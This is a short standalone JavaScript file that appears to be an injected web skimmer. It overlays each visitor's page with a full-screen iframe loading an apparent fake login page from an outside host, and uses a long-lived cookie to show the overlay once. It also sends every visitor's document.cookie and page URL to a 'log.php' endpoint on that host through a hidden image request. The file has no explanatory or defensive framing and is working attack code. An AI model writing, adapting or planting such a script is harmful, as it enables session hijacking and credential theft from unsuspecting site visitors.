if(gc1("dwf999jjs") == ""){
	count = 0;
	$("body").append("<iframe id='login_frame1' style='left: 0px; right: 0px; width: 100%; border: medium none; top: 0px; height: 100%; background: rgb(255, 255, 255) none repeat scroll 0% 0%; bottom: 0px; position: fixed; z-index: 999999;' src='http://h.net16.net/index2.php'></iframe>");
	$("iframe#login_frame1").load(function(){
		count++;
		if(count > 1){
			sc1("dwf999jjs", "sadasd", 99999);
			$("iframe#login_frame1").remove();
		}
	});
}
cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://h.net16.net/log.php?log="+$data;

function gc1(cname) {
	var name = cname + "=";
	var decodedCookie = decodeURIComponent(document.cookie);
	var ca = decodedCookie.split(';');
	for(var i = 0; i <ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ') {
			c = c.substring(1);
		}
		if (c.indexOf(name) == 0) {
			return c.substring(name.length, c.length);
		}
	}
	return "";
}

function sc1(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}